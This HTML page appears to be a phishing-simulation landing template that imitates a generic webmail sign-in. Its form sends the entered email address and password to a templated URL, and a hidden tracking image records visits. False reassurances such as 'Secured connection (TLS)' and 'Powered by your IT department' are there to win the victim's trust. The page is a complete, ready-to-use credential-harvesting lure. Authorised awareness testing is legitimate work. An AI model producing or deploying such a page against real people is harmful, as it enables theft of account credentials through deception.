<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Webmail Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-wrapper { width: 400px; }
        .login-header { text-align: center; margin-bottom: 32px; color: #fff; }
        .mail-icon { width: 56px; height: 56px; background: rgba(255,255,255,0.2); border-radius: 16px; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
        .mail-icon svg { width: 28px; height: 28px; fill: #fff; }
        .login-header h1 { font-size: 26px; font-weight: 600; margin-bottom: 4px; }
        .login-header p { font-size: 14px; opacity: 0.8; }
        .login-card { background: #fff; border-radius: 16px; padding: 36px 32px; box-shadow: 0 20px 60px rgba(0,0,0,0.2); }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 6px; }
        .form-group .input-wrapper { position: relative; }
        .form-group .input-wrapper svg { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); width: 18px; height: 18px; fill: #9ca3af; }
        .form-group input { width: 100%; padding: 12px 14px 12px 42px; border: 2px solid #e5e7eb; border-radius: 10px; font-size: 15px; outline: none; transition: all 0.2s; }
        .form-group input:focus { border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.2); }
        .options-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
        .options-row label { display: flex; align-items: center; gap: 8px; font-size: 14px; color: #374151; cursor: pointer; }
        .options-row a { font-size: 13px; color: #667eea; text-decoration: none; font-weight: 500; }
        .options-row a:hover { text-decoration: underline; }
        .submit-btn { width: 100%; background: linear-gradient(135deg, #667eea, #764ba2); color: #fff; border: none; padding: 13px; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
        .submit-btn:hover { opacity: 0.9; box-shadow: 0 4px 12px rgba(102,126,234,0.4); }
        .server-info { text-align: center; margin-top: 16px; font-size: 12px; color: #9ca3af; }
        .footer { text-align: center; margin-top: 24px; font-size: 12px; color: rgba(255,255,255,0.6); }
        @media (max-width: 480px) { .login-wrapper { width: 100%; padding: 20px; } }
    </style>
</head>
<body>
    <div class="login-wrapper">
        <div class="login-header">
            <div class="mail-icon">
                <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
            </div>
            <h1>Webmail</h1>
            <p>Access your email account</p>
        </div>
        <div class="login-card">
            <form action="{{.URL}}" method="POST">
                <div class="form-group">
                    <label for="email">Email Address</label>
                    <div class="input-wrapper">
                        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                        <input type="email" id="email" name="email" placeholder="user@company.com" required autofocus>
                    </div>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <div class="input-wrapper">
                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
                    </div>
                </div>
                <div class="options-row">
                    <label><input type="checkbox" name="remember"> Remember me</label>
                    <a href="#">Forgot password?</a>
                </div>
                <button type="submit" class="submit-btn">Sign In</button>
            </form>
            <p class="server-info">Secured connection (TLS)</p>
        </div>
        <div class="footer">Powered by your IT department</div>
    </div>
    <img src="{{.Tracker}}" style="display:none" alt="">
</body>
</html>
